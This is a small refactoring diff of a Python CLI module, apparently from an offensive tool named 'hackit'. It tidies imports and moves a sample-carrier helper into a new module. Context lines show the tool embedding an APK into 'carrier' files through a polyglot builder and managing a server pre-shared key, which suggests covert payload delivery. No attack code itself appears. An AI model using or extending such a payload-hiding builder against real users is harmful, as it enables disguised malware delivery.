@@ -8,14 +8,11 @@ from __future__ import annotations
 
 import json
 import os
-import shutil
-import subprocess
-import sys
 from typing import List, Optional
 
-from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN, RED, YELLOW
+from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED, YELLOW
 
-from . import builder, ios, polyglot, server, store, ui
+from . import builder, ios, polyglot, samples, server, store, ui
 
 BANNER = _colored(
     r"""
@@ -72,9 +69,9 @@ def _ensure_config() -> dict:
 def _psk_b64() -> str:
     import base64
 
-    return base64.b64encode(server.load_psk(server.store.ROOT + "/psk.txt")
-                            if os.path.exists(server.store.ROOT + "/psk.txt")
-                            else server.write_psk(server.store.ROOT + "/psk.txt")).decode("ascii")
+    return base64.b64encode(server.load_psk(store.ROOT + "/psk.txt")
+                            if os.path.exists(store.ROOT + "/psk.txt")
+                            else server.write_psk(store.ROOT + "/psk.txt")).decode("ascii")
 
 
 def _latest_apk() -> Optional[str]:
@@ -106,7 +103,7 @@ def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
     if carrier and os.path.isfile(carrier):
         source = carrier
     else:
-        source = polyglot.sample(ext, folder)
+        source = samples.sample(ext, folder)
         print(_colored(f"  sample carrier  {source}", DIM))
     result = polyglot.build(source, apk, out_dir=folder)
     print(_colored(f"  carrier   {result.carrier}", B_GREEN))
